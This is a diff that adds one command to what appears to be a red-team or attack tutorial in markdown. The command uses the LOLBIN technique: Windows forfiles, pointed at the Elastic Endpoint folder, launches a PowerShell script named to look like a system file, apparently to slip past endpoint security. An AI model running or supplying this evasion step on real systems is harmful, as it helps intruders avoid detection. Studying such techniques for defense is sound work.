@@ -53,4 +53,6 @@ In real‑world attacks:
 After gaining full PowerShell capabilities, we move to a **LOLBIN (Living Off The Land Binary)** technique.
 
 We use the legitimate Windows binary:
-
+```powershell
+forfiles /p "C:\Program Files\Elastic\Endpoint" /m elastic-endpoint.exe /c "powershell -command C:\Temp\system32.ps1"
+```
